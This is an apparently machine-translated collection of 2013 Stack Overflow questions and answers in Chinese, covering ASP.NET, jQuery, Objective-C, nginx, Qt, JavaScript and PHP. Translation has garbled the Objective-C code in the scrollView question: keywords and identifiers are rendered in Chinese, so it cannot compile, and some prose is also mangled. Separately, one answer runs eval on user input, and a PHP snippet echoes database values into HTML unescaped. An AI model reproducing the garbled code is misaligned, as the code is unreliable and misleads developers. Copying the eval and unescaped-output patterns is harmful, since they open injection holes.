        return View(user);
    }

    // POST: /User/Delete/5
    [HttpPost, ActionName("Delete")]
    public ActionResult DeleteConfirmed(int id)
    {
        User user = db.Users.Find(id);
        db.Users.Remove(user);
        db.SaveChanges();
        return RedirectToAction("Index");
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T02:43:54.363

要在不往返数据库的情况下删除，您可以执行以下操作：

```
[HttpPost, ActionName("Delete")]
public ActionResult DeleteConfirmed(int id)
{
    User user = new User {UserID = id};
    db.Users.Attach(user);
    db.Users.Remove(user);
    db.SaveChanges();
    return RedirectToAction("Index");
} 
```

# javascript - 选择单选按钮时jQuery更改内容

> ID：15262025
> 
> 赞同：1
> 
> 时间：2013-03-07T02:33:02.317
> 
> 标签：javascript, jquery, html

有人可以帮我解决一个简单的 jQuery 代码，当单击不同的单选按钮时，它会显示不同的内容。
[http://jsfiddle.net/AXsVY/](http://jsfiddle.net/AXsVY/)

**HTML**

```
<label class="radio inline">
    <input id="up_radio" type="radio" name="optionsRadios" value="update" checked>
    Update
</label>
<label class="radio inline">
    <input id="ov_radio" type="radio" name="optionsRadios" value="overwritten">  
    Overwritten
</label>

<p id="cont">
    sth. here
</p> 
```

**JavaScript**

```
$("#up_radio").click(function(){

    if ($("#up_radio").is(":checked")) {

        //change to "show update"
         $("#cont").value = "show update";

    } else if ($("#ov_radio").is(":checked")) {

       // change to "show overwritten"
    }
}); 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-07T02:36:39.923

[http://jsfiddle.net/AXsVY/2/](http://jsfiddle.net/AXsVY/2/)

用于更改而不是单击。点击触发器发生变化，但用户也可以跨过标签并点击箭头键。它会永远`change`。

```
$('input[name="optionsRadios"]').on('change', function(){
    if ($(this).val()=='update') {
         //change to "show update"
         $("#cont").text("show update");
    } else  {
         $("#cont").text("show Overwritten");
    }
}); 
```

此外，设置值的正确语法是，`$("#something").val("the value");`但在这种情况下 #cont 是一个 div，因此您需要使用`.text()`or `.html()`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-07T02:41:41.063

根据您的方法已解决。您可以进行更多优化，但我主要保持原样：

[http://jsfiddle.net/digitalextremist/mqrHs/](http://jsfiddle.net/digitalextremist/mqrHs/)

这是小提琴外的代码：

```
$(".radio input[type='radio']").on( 'click', function(){
    if ($("#up_radio").is(":checked")) {
         $("#cont").html( "show update" );
    } else if ($("#ov_radio").is(":checked")) {
         $("#cont").html( "show overwritten" );
    }
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T02:37:10.203

```
 $("input:radio[name=optionsRadios]").click(function() {
        var value = $(this).val();

        if(value="update")
          $("#cont").text("show update");   
       else
         $("#cont").text("show update other");

    }); 
```

# class - 此类与键 scrollView 的键值编码不兼容

> ID：15262027
> 
> 赞同：1
> 
> 时间：2013-03-07T02:33:24.890
> 
> 标签：class, scrollview

我需要这方面的帮助。我已将 xcode 更新到最新版本，当我尝试进行测试时，旧代码会引发错误“类与键滚动视图的键值编码不兼容”。

有趣的是，这里没有滚动视图。我有其他视图几乎完全相同的代码，它工作正常。这是代码。也没有笔尖，因此从视图中取出滚动视图将不起作用。

```
                #import "pearGalleryController.h"
                #import "pearGallery.h"

                @implementation pearGalleryController

                - (void)viewDidLoad {
                    [超级视图DidLoad];

                    self.tableView.backgroundColor = [UIColor colorWithRed:0.0 green:0.0 blue:0.0 alpha:100];
                    self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone;
                    self.navigationItem.title = @"各种梨";

                }

                - (void)didReceiveMemoryWarning {
                    // 如果没有超级视图，则释放视图。
                    [super didReceiveMemoryWarning];

                    // 释放所有未使用的缓存数据、图像等。
                }

                - (void)viewDidUnload {

                }

                #pragma mark 表格视图方法

                - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
                    返回 1；
                }

                // 自定义表格视图中的行数。
                - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
                    返回 3；
                }

                - (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath;
                {
                    返回 122；
                }

                // 自定义表格视图单元格的外观。
                - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

                    静态 NSString *CellIdentifier = @"Cell";

                    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
                    如果（细胞 == 零）{
                        // cell 是 UITableViewCell 的一个对象 这将一个对象分配给一个 cell 2 个内存区域，o 需要在 alloc 上自动释放，因为它是一个对象
                        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier] autorelease];
                    }

                    cell.selectionStyle = UITableViewCellSelectionStyleNone;
                    // 设置单元格...
                    int picIndex = [indexPath 行]*3;

                    UIButton* tempView = [[UIButton alloc]initWithFrame:CGRectMake(0, 0, 107,123)];

                    [tempView setImage:[UIImage imageNamed:[NSString stringWithFormat:@"pears_%d.png",picIndex]]
                              forState:UIControlStateNormal];

                    tempView.tag = picIndex;
                    [tempView addTarget:self action:@selector(buttonClick:) forControlEvents:UIControlEventTouchUpInside];
                    [cell.contentView addSubview:tempView];
                    [临时视图发布]；

                    tempView = [[UIButton alloc]initWithFrame:CGRectMake(106, 0, 107,123)];

                    [tempView setImage:[UIImage imageNamed:[NSString stringWithFormat:@"pears_%d.png",picIndex+1]]
                              forState:UIControlStateNormal];

                    tempView.tag = picIndex+1;
                    [tempView addTarget:self action:@selector(buttonClick:) forControlEvents:UIControlEventTouchUpInside];
                    [cell.contentView addSubview:tempView];
                    [临时视图发布]；

                    tempView = [[UIButton alloc]initWithFrame:CGRectMake(212, 0, 107,123)];

                    [tempView setImage:[UIImage imageNamed:[NSString stringWithFormat:@"pears_%d.png",picIndex+2]]
                              forState:UIControlStateNormal];

                    tempView.tag = picIndex+2;
                    [tempView addTarget:self action:@selector(buttonClick:)      
                     forControlEvents:UIControlEventTouchUpInside];

                    [cell.contentView addSubview:tempView];
                    [临时视图发布]；     

                    返回单元格；
                    }

                    -(void)buttonClick:(id)sender

                    {
                    UIButton* btn = (UIButton*)sender;
                    int 索引 = btn.tag;

                    pearGallery *anotherViewController = [[pearGallery alloc] initWithNibName:@"pearGallery" bundle:[NSBundle mainBundle]];

                    anotherViewController.myIndex = 索引；

                    [self.navigationController pushViewController:anotherViewController 动画：YES];
                    [另一个ViewController 版本];

                    UIBarButtonItem *backButton = [[UIBarButtonItem alloc] initWithTitle:@"Back" style:UIBarButtonItemStylePlain target:nil action:nil];
                    //UIBarButtonItem *backButton = [[UIBarButtonItem alloc] initWithImage:[UIImage imageNamed:@"video.png"] style:UIBarButtonItemStylePlain target:nil action:nil];
                    self.navigationItem.backBarButtonItem = backButton;
                    [返回按钮释放];

                }

                - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

                }

                - (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
                    return (interfaceOrientation == UIInterfaceOrientationPortrait);
                }

                - (无效)dealloc {
                    [超级释放];
                }

                @结尾

```

和 h 文件

```
     ＃进口

    @interface pearGalleryController : UITableViewController {

    }

    @结尾

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-05T22:04:35.010

可能是您的 xib 文件中的悬空引用，请检查以确保清除引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-29T14:36:09.990

通常，当您有一个对象时会发生此错误，在您的情况下，它是通过界面构建​​器附加到故事板/xib 中的**scrollView**项的**“scrollView” 。**

 **检查界面生成器中的链接（最右边的选项卡），并且您没有指向另一个**IBOutlet 的重复链接。**

我发现只有当我链接一个对象然后“错误输入”我的链接时才会发生这种情况，我去更改它但不要从界面构建器中删除旧链接，即 SCrollview 和 scroLLview2

转到您的界面构建器（连接选项卡）并检查您没有重复的链接。删除所有指向**“scrollview** ”的链接和“重新链接”到 .h 文件的链接，然后重试

您可能已经输入**了 scrollView**然后将其更改为**scrollview**并没有意识到......祝你好运**

# php - 使用 NGINX 和 Codeigniter 的子域

> ID：15262031
> 
> 赞同：2
> 
> 时间：2013-03-07T02:33:41.357
> 
> 标签：php, codeigniter, redirect, nginx, subdomain

我想在我的网站上有各种子域，例如：`biology.mysite.com`.

目前我的 nginx.conf 中有以下内容：

```
server {
  listen 80;
  server_name biology.mysite.com;
  return 301  https://mysite.com/tags/biology$request_uri;
} 
```

此代码的工作原理是，如果您将浏览器指向`biology.mysite.com`，它会重定向到`https://mysite.com/tags/biology`并加载正确的生物学内容。

但是，我**不想**重定向 url，但想将子域保留为 url。

所以我根据[这个要点](https://gist.github.com/lynxluna/1050850)用下面的代码替换了上面的代码，但它没有效果（意味着`biology.mysite.com`简单地指向`mysite.com`）：

```
 if ($host ~* ^www\.([a-z0-9]*)\.(mysite\.com) )
      {
          set $tagname $1;
          set $host_without_www $2;
          rewrite ^/(.*)$ $scheme://$tagname.$host_without_www/ permanent;
      }

      if ($host ~* ^([a-z0-9]+)\.(mysite\.com))
      {
          set $tagname $1;
            set $host_without_www $2;

            rewrite ^/$ /index.php/tags/index/ last;
            rewrite ^/(.+)$ /index.php/$1 last;
      } 
```

想法？

**请注意**我在此处发布此内容而不是[Serverfault](http://serverfault.com)的原因是 b/c 我使用的是 Codeigniter 框架（它具有独特的路由方案），因此答案可能涉及 NGINX 和 Codeigniter 的知识。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-11T21:28:58.013

我相信您的最后一次重写应该如下所示：

```
rewrite ^/(.+)$ /index.php/tags/$tagname$1 last; 
```

**更新：** 如果您想将 subdomain.mysite.com（没有 uri 部分）之类的请求重定向到标签控制器并使用子域方法，您应该更改下面的行

```
rewrite ^/$ /index.php/tags/index/ last; 
```

至

```
rewrite ^/$ /index.php/tags/$tagname/ last; 
```

lynxluna 的 nginx 配置和提到的要点中的注释是错误的。

# vb.net - 从 datagridview 中的现有 SelectedRows 集合创建自定义 SelectedIndices 集合

> ID：15262032
> 
> 赞同：0
> 
> 时间：2013-03-07T02:33:41.740
> 
> 标签：vb.net, c#-3.0

我需要编写一个自定义集合，它将存储 datagridview 的选定索引。我们在 Datagridview 中已经存在 SelectedRows colllection 属性。我想使用它并获取索引集合，以便我可以创建 SelectedIndices 作为我的 Datagridview 的自定义属性，该属性是集合类型。有人可以帮我怎么做。

以供参考; Selectedindices 是 Microsoft 提供的 Listview 的一个属性。我希望与 Datagridview 相同。但是因为我没有，所以我想使用 SelectedRows 属性并为我的 datagridview 创建一个自定义属性 Selectedindices。它应该是 Collection 类型。请建议我是否可以这样做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:38:18.863

我相信该功能已经可用，也许您可​​以通过查看下面的链接了解更多信息？

[http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridviewselectedrowcollection.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridviewselectedrowcollection.aspx)

还有一点代码示例，说明您已经走了多远，或者您已经尝试过什么，总能吸引其他成员提供更多帮助。

# ios - iOS：如何使用相同的 Popover ViewController 来控制两个单独的按钮

> ID：15262037
> 
> 赞同：-1
> 
> 时间：2013-03-07T02:34:18.337
> 
> 标签：ios, objective-c

In RootViewController I have a button *flop1 that when clicked opens PopViewController through segue *segPop and when a selection is chosen and the popover closes, button *flop1 's image is changed.

我希望有多个按钮，例如 *flop1，每个按钮都可以由自己选择的图像填充，同时使用相同的 PopViewController。

我已经通过 seque *segPop2 将 *flop2 连接到同一个 PopViewController。

根视图控制器.m

```
-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

if ([[segue identifier] isEqualToString:@"segPop"]) {
    currentPopoverSegue = (UIStoryboardPopoverSegue *)segue;
    pvc = [segue destinationViewController];
    [pvc setDelegate:self];
    [pvc setStrPassedValue:[tfUserText text]];
} else if ([[segue identifier] isEqualToString:@"segPop2"]) {
    currentPopoverSegue = (UIStoryboardPopoverSegue *)segue;
    pvc = [segue destinationViewController];
    [pvc setDelegate:self];
    [pvc setStrPassedValue:[tfUserText text]];
}
}

// PopViewControllerDelegate callback function
- (void)dismissPop:(NSString *)value {
NSString *imagefile;
imagefile = [NSString stringWithFormat:@"%@.png",value];
[flop1 setImage:[UIImage imageNamed:imagefile] forState:UIControlStateNormal];
[[currentPopoverSegue popoverController] dismissPopoverAnimated: YES]; // dismiss the popover
}

@end 
```

如何在我的

```
- (void)dismissPop:(NSString *)value { 
```

用新图像填充 *flop2 按钮，同时保持 *flop1 图像不变？

如果这一切看起来很混乱，我很抱歉，我的编程教育为零，并且正在通过模仿来尝试所有这些。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:11:54.907

在这种方法中：

```
 -(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender 
```

`sender`是指向调用 segue 的对象的指针（在您的情况下是按钮）。您可以在 popoverViewController 中定义一个属性：

```
@property (strong, nonatomic) UIButton* buttonThatInvokedMe; 
```

将其设置为您的调用按钮`prepareForSegue`：

```
[pvc setButtonThatInvokedMe:sender]; 
```

然后将其返回到修改后的 dismssPop：

```
- (void)dismissPop:(NSString *)value buttonThatInvokedPopover:(UIButton*)button {
    NSString *imagefile;
    imagefile = [NSString stringWithFormat:@"%@.png",value];
    [button setImage:[UIImage imageNamed:imagefile] forState:UIControlStateNormal];
    [[currentPopoverSegue popoverController] dismissPopoverAnimated: YES]; 
    // dismiss the popover
} 
```

你会像这样从你的 popOverVC 调用它：

```
[self.delegate dismissPop:value button:buttonThatInvokedMe] 
```

不需要...您`if else`还应该能够省去.`if else``prepareForSegue`

您需要使按钮指针传递类型保持一致以避免编译器警告。如果您确定 Segue 只会被 UIButton 类型调用，请更改您的 prepareForSegue 签名以对发送者进行类型转换：

```
-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(UIButton*)sender 
```

另一种方法是将其保留为`id`类型，但将 popOverViewController 中的指针类型更改为`id`并将其传递回委托方法`id`- 但是您需要`UIButton`在调用`setImage:forState`方法之前将其类型化，因为这需要一个`UIBUtton`类型..

*协议*

为了使这一切在没有编译器警告的情况下工作，您还需要为`dismissPop:`委托方法声明一个协议或使用`performSelector`-type 方法来间接调用它。

# qt - Qt：为什么我的按钮没有收到信号？

> ID：15262042
> 
> 赞同：2
> 
> 时间：2013-03-07T02:35:30.020
> 
> 标签：qt, signals-slots, emit

为什么单击按钮时**按钮**对象没有收到 sigKK() 信号？

当一个信号发出时，**所有的qt对象**都能接收到这个信号吗？

代码如下：

```
class PushButton :  public QPushButton
{
    Q_OBJECT
signals:
    void sigKK();
}; 
```

PushButton 类继承自 QPushButton，但此处不连接信号和插槽。这是正确的吗？

```
class MainWindow : public QMainWindow
{
    Q_OBJECT    
public:
    explicit MainWindow(){
        resize(400,200);    
        connect(this,SIGNAL(sigKK()),this,SLOT(showRecv1()));   

        button = new PushButton();
        button->setText("Hello,All");
        button->resize(40,15);
        connect(button, SIGNAL(clicked()),this,SLOT(buttonCK()));
        connect(button, SIGNAL(sigKK()),this,SLOT(showRecv2()));
            //**I can connect sigKK signal with showRecv2 slot here ?**** 
        button->show();
    }
    ~MainWindow(){      
    }
signals:
    void sigKK();
public slots:
    void showRecv1(){
        cout<<"recved 1"<<endl;
        resize(100,100);
    }
    void showRecv2(){
        cout<<"recved 2"<<endl;
        button->setText(".....");
    }
    void buttonCK(){
        emit sigKK();
        cout<<"emited"<<endl;
    }
private:
    PushButton *button ; 
};
#endif 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T02:48:21.167

> 当一个信号发出时，所有的 qt 对象都能接收到这个信号吗？

**没有**。当一个信号被发出时，它只被带有信号或槽连接到它的 QObjects 接收。

您的 MainWindow 和 PushButton 都有一个同名的信号......但它们仍然是不同的信号。它们彼此完全无关。当 MainWindow 发出`sigKK`时，这对 PushButton 没有影响`sigKK`。

在您的示例中，`sigKK`似乎完全没有必要。也许您可以`clicked()`直接连接到您想要执行的操作？

```
connect(button, SIGNAL(clicked()),this,SLOT(showRecv1()));
connect(button, SIGNAL(clicked()),this,SLOT(showRecv2())); 
```

# wpf - WPF：如何在元素宽度发生变化时为其设置动画

> ID：15262046
> 
> 赞同：0
> 
> 时间：2013-03-07T02:35:49.407
> 
> 标签：wpf, xaml, animation, width, element

这应该很容易，但我在这里空白。

我有一个`TextBlock`内部`Border`控件。的变化基于文本中的长度`Width`（在 ViewModel 中更新）。我希望对这种变化进行动画处理，以便宽度缓慢增长（而不是生涩）。`Border``TextBlock``Width`

我的 Xaml：

```
<Border x:Name="myBorder" BorderBrush="Black" BorderThickness="1" HorizontalAlignment="Left" VerticalAlignment="Top">
    <TextBlock x:Name="myTextBlock" HorizontalAlignment="Left" Text="Some Text"/>
</Border> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:54:15.113

这是 Expression Blend 的完美工作。您将需要创建一个`Storyboard`动画。然后一旦它创建进入视觉工作室背后的代码并播放它。您可以根据文本块中的文本数量告诉它播放到某个点。

这是一个基本教程 [http://www.silverlightbuzz.com/2009/10/12/animating-with-storyboards-in-blend/](http://www.silverlightbuzz.com/2009/10/12/animating-with-storyboards-in-blend/)

这个例子也有后端代码 [http://dotnet.dzone.com/articles/wpf-storyboard-%E2%80%93-what-it-and](http://dotnet.dzone.com/articles/wpf-storyboard-%E2%80%93-what-it-and)

# opengl - Frustum Culling 的“雷达方法”：第一次简单测试失败？

> ID：15262048
> 
> 赞同：6
> 
> 时间：2013-03-07T02:36:08.163
> 
> 标签：opengl, go, frustum, culling, rendering-engine

尝试至少让[Lighthouse3D 雷达截锥体剔除教程的](http://www.lighthouse3d.com/tutorials/view-frustum-culling/radar-approach-testing-points/)**非常简单** 的第 1 部分工作......并且我什至无法在我的渲染器中使该部分工作，这让我感到非常困惑。

所以第一步是：你测试一个点是在近平面前面还是在远平面后面，如果是这样，就提前剔除。（如果没有，您将执行进一步的测试，但我只停留在第一部分。）

我使用 2x2 立方体的世界空间中心 (x1y2z3) 并有一个可以自由移动和旋转的相机。我所有的向量和矩阵的东西都必须相当坚固，否则渲染器工作得很好。所以这是我对第一部分的看法（在 Go 中），简单的“Z vs near-or-far”测试：

```
func (cam *Camera) frustumHasPoint(point *Vec3) bool {
    var pc Vec3
    v := point.Sub(&cam.Controller.Pos)  // point minus camPos
    ref := cam.Controller.dir  // take a copy of camDir
    ref.Z = -ref.Z
    ref.Normalize() // camDir was already normalized but anyway...
    pc.Z = v.Dot(&ref)
    if pc.Z > cam.Perspective.ZFar || pc.Z < cam.Perspective.ZNear {
        return false
    }
    return true
} 
```

现在为什么我要反转 ref 的 Z？因为在教程中他们写道：“请注意，图中的引用不是右手系统（如在 OpenGL 中），因为 Z 的方向已反转以使教程更直观”——嗯，在 GL 教程中当然，这会产生相反的效果......

好吧，如果像上面那样反转 Z，它会在大约 50% 的时间里剔除更多；如果我不这样做，那么它大约有 98% 的时间会“过度剔除”..

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-09T02:02:39.790

解决。原因是大脑故障......教程清楚地写了关于首先获取 x/y/z 轴来描述截锥体，不知何故我错过了..

# jquery - 具有 name 属性的元素的 jQuery 选择器

> ID：15262060
> 
> 赞同：1
> 
> 时间：2013-03-07T02:37:20.690
> 
> 标签：jquery

如何选择包含“名称”属性的元素？

元素示例：

```
<select id="itemPK.country.id_id" name="itemPK.country.id"><option value="7">India</option><option value="8">Malaysia</option></select>

<input id="point_id" name="point" type="number" value=""> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T02:40:26.893

```
$('[name]') 
```

试试这个，你可以得到所有有名字的元素

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T02:41:18.530

[属性选择器](http://api.jquery.com/category/selectors/attribute-selectors/)是您需要的：

```
$('input[name="point"]')...
$('[name="something"]') //In case it's not specifically an <input> element 
```

祝你好运

编辑：我明白了，您可能要求包含某个属性的元素，而不是那些在 name 属性中包含 X 值的元素。PSR 提供​​的答案是要走的路。[这](http://api.jquery.com/has-attribute-selector/)是“具有属性”选择器的文档。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T02:42:32.327

使用[属性选择器](http://api.jquery.com/attribute-equals-selector/)

```
$("*[name='point']") 
```

# mercurial - TortoiseHg - 如何从较早的版本开始创建功能分支

> ID：15262065
> 
> 赞同：0
> 
> 时间：2013-03-07T02:37:39.147
> 
> 标签：mercurial, tortoisehg

我在默认分支上工作了三周，经常提交。我现在想更新到 3 周前的某个点，并默认推/拉等，就好像那 3 周不存在一样。理想情况下，我可以说“Mercurial，请将过去 3 周内的所有工作视为新功能分支”，这样我就可以继续使用默认设置，直到我修复需要修复的问题。然后我可以返回我的功能分支。

我知道我应该在 3 周前开始一个功能分支，但我们都犯了错误......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:02:32.927

只要您还没有推送到公共回购，您就可以：

1.  更新到 3 周前
2.  创建命名分支
3.  rebase 'ahead commits' 默认为指定分支。
4.  您可能希望将命名分支的“阶段”更改为秘密，这样您就不会意外推送它。

如果您之前没有使用过 Rebase，则必须在 File -> Settings -> Extensions 中启用扩展。

否则，如果您已推送，则：

1.  更新到 3 周前的点。
2.  只需提交更改（默认创建两个头）
3.  完成后，在将一个默认头合并到另一个默认分支之前。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T06:37:56.153

我建议从 3 周前的修订版中克隆到一个新的本地存储库。在这个新的存储库上工作，然后在准备好后，推送回父级（本地）。

我喜欢使用克隆而不是分支，因为它使我可以更简单地查看状态。就我而言，为每个可以切换的存储库都有一个 Eclipse 工作空间。

这可能不是您所要求的，但它是满足您需求的有效解决方案。

我希望这有帮助。

# php - 如何使用 jquery 创建数组并更改会话？

> ID：15262067
> 
> 赞同：0
> 
> 时间：2013-03-07T02:37:44.187
> 
> 标签：php, jquery, ajax, json, playlist

如何使用 jquery 创建数组并更改会话？

我想在 $_SESSION ["playlist"] 中存储带有标题、url mp3 和作者的歌曲列表

这是我的html代码示例

```
 <a class="add-music" data-title="Title of the little song" data-artist="artist1" href="audios/song-little.mp3">Add to List</a>
    <a class="download-music" href="audios/song-little.mp3">Download</a>

    <a class="add-music" data-title="Title of middle song" data-artist="artist2" href="audios/song-middle.mp3">Add to List</a>
    <a class="download-music" href="audios/song-middle.mp3">Download</a>

    <a class="add-music" data-title="Title of big song" data-artist="artist3" href="audios/song-big.mp3">Add to List</a>
    <a class="download-music" href="audios/song-big.mp3">Download</a> 
```

我的jQuery就是这样

```
 $( document ).ready(function() {
    $('.add-music').click(
function() {
  var songNew=new Array ({
    title: $(this).attr('data-title'),

    artist: $(this).attr('data-artist'),
    mp3: $(this).attr('href')
  });
});
}); 
```

我想知道如何在会话中存储几首歌曲及其标题、作者和 mp3 网址

我读到用json，我可以为每首歌曲设置一个字符串的值，以及一个包含多个字符串的数组，这个数组保存会话

谢谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T05:00:09.233

我认为您想通过 ajax 将数组发送到服务器，然后将其保存在会话中。

如果您不知道如何发送，您可以使用 javascript 对象表示法。

```
var data={title:"sometitle",song:"song"} 
```

你甚至可以使用嵌套的 javascript 对象表示法来像数组一样使用它。

然后您可以使用 post 在 $.ajax 调用中使用它。您可以使用 $_POST['title']; 在 php 中检索这些值 和 $_POST['song'];

# biztalk - BizTalk 将记录映射成对

> ID：15262076
> 
> 赞同：1
> 
> 时间：2013-03-07T02:38:13.050
> 
> 标签：biztalk, biztalk-2010

使用 BizTalk Map 并想知道是否有执行以下操作的好方法。

我需要将收到的发票映射到订单列表。然而，每个订单必须只包含两个行项目（假设发票有一个偶数）。

这意味着 Invoice(1, 2, 3, 4) 应该映射到 Orders(Order (1, 2), Order (3, 4))。

本质上，我需要在`(index % 2 == 0)`.

有没有一种**仅限functoid的**方法？

下面的 XML 示例：

```
<Invoice>
  <Client>Client1</Client>
  <Line>
    <Code>1</Code>
    <Price>$1.00</Price>
    <Qty>1</Qty>
  </Line>
  <Line>
    <Code>2</Code>
    <Price>$2.00</Price>
    <Qty>2</Qty>
  </Line>
  <Line>
    <Code>3</Code>
    <Price>$3.00</Price>
    <Qty>3</Qty>
  </Line>
  <Line>
    <Code>4</Code>
    <Price>$4.00</Price>
    <Qty>4</Qty>
  </Line>
</Invoice> 
```

至

```
<Orders>
  <Order>
    <Client>Client1</Client>
    <OrderItem>
      <Code>1</Code>
      <Qty>1</Qty>
    </OrderItem>
    <OrderItem>
      <Code>2</Code>
      <Qty>2</Qty>
    </OrderItem>
  </Order>
  <Order>
    <Client>Client1</Client>
    <OrderItem>
      <Code>3</Code>
      <Qty>3</Qty>
    </OrderItem>
    <OrderItem>
      <Code>4</Code>
      <Qty>4</Qty>
    </OrderItem>  
   </Order>
</Orders> 
```

**我试过的：**

*   标准映射：如预期的那样，包含所有行的单个订单
*   *客户*价值映射基于`index % 2`：每行订单（一半有*客户*）
*   表循环（门控到`index % 2`）+ 提取器到*客户端*：每行订单，只有半行

**我最终可能会做的事情：**

*   XSLT
*   或者，映射后的 C# 操作

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-09-05T16:24:40.257

在工具箱的高级 functoids 部分中，查找“index”functoid。在输出上添加脚本 functoid。添加 C# 代码以检查要匹配的索引。您可以通过从脚本函数返回布尔值来打开和关闭输出。

# javascript - 添加以逗号分隔的数字的Javascript

> ID：15262078
> 
> 赞同：-3
> 
> 时间：2013-03-07T02:38:24.220
> 
> 标签：javascript

我正在尝试获取文本框中所有整数的总和。数字用逗号分隔。我需要将数字相加并得到它们的总和。遗憾的是，我无法得到它们。

我的代码是：

```
 <script type="text/javascript">
        function computeData()
        {
            var data = document.getElementById("data").value;
            var temp = data.split(",");
            for( i=0; i<temp.length; i++)
            var k=0;
            {
                var j = temp[i];
                k  = k + j;
                alert(k);
            }
            document.getElementById("sum").value= k;
        }
    </script> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T02:40:10.107

您需要使用以下方法将字符串解析为整数`parseInt`：

```
> 2 + '3'
'23'
> 2 + parseInt('3', 10)
5 
```

`10`告诉`parseInt`假设该数字是基数为 10 。如果您有浮点数，请使用`parseFloat()`（您不需要指定基数）：

```
> 2 + parseFloat('3.13')
5.13 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T02:41:53.793

如果您知道它们将是整数：

```
var data = document.getElementById("data").value;
var sum = data.split(",").reduce(function(prev, curr){
    return parseInt(prev,10) + parseInt(curr,10);
 }); 
```

如果您不确定整数，您可以使用`parseFloat`它来代替 parseInt。

请注意，这可能不适用于旧版浏览器。如果您需要支持早于 IE9 的 IE，您可能只想在循环中按原样使用 parseInt/parseFloat。（将 k 声明移到循环外）

```
var k=0;
for( i=0; i<temp.length; i++)
{
     var j = temp[i];
     k  = k + parseInt(j,10);
     alert(k);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:12:21.423

考虑：

```
var data = '1,2,3';

eval(data.split(',').join('+'))); // 6 
```

或者

```
eval(data.replace(/,/g,'+')); // 6 
```

### 编辑

对于所有那些讨厌 eval 的人（你知道你是谁！！）：

```
var sum = data.split(',').reduce(function(p, c){return p + +c},0); 
```

请注意，需要对[ES5 *reduce*](http://ecma-international.org/ecma-262/5.1/#sec-15.4.4.21)的支持，MDN 上有一个[polyfill](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce#Polyfill)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T04:46:55.900

我喜欢 eval 的想法，但您也可以使用正则表达式来匹配和汇总整数和小数，以及任何加号或减号。非数字将被忽略，因此您可以使用逗号或空格分隔，或者仅在数字之间使用“+”或“-”。

```
function computeData(){
    var data= document.getElementById("data").value;
    var rx=/([+-]?(\.\d+|\d+(\.\d+)?))/g, n= 0, M;
    while((M= rx.exec(data))!= null){
        n+= (+M[1])
    }
    document.getElementById("sum").value= n;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-07T02:55:12.607

这可能适用于整数或浮点数的 CSV 字符串。

```
var data = document.getElementById("data").value;
var a = data.match(/\d+(?:[.]\d+)?/g);
var num = 0;
a.forEach(function(n){
    num += parseFloat(n);
});

console.log(num); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-07T02:55:23.730

我可能还会建议以下语法

```
 var temp = data.split(",");
        for(var i=0, k=0; i<temp.length; i++;)
        {
            k += parseInt(temp[i]);
        } 
```

# php - 使用 PHP 类输出 html

> ID：15262079
> 
> 赞同：0
> 
> 时间：2013-03-07T02:38:40.530
> 
> 标签：php, facebook, oop, scope

我之前问过同样的问题，它被否决了，我不知道为什么。我正在构建一个输出新闻提要的类，但它是一个非常结构化的 html，我将在网站上大量使用（数百次），所以我使用类方法来显示提要 html 和一切。我只是回应整个事情。

该方法是这样设置的：

```
private function feed ($var)
{
    $Statement = $this->Database->prepare("SELECT * FROM feed WHERE col = ? ORDER BY timestamp DESC LIMIT 50");
    $Statement->execute(array($var));

    while ($row = $Statement->fetch(PDO::FETCH_ASSOC))
    {
        echo '  <div class="feed-box">
                    <a href="feed.php?id=' . $row["facebook_id"] . '">' . /*facebook name retrieved from the facebook */ . '</a>
                    ' . $row["post"] . '
                    <br/>
                </div>';
    }
} //end feed 
```

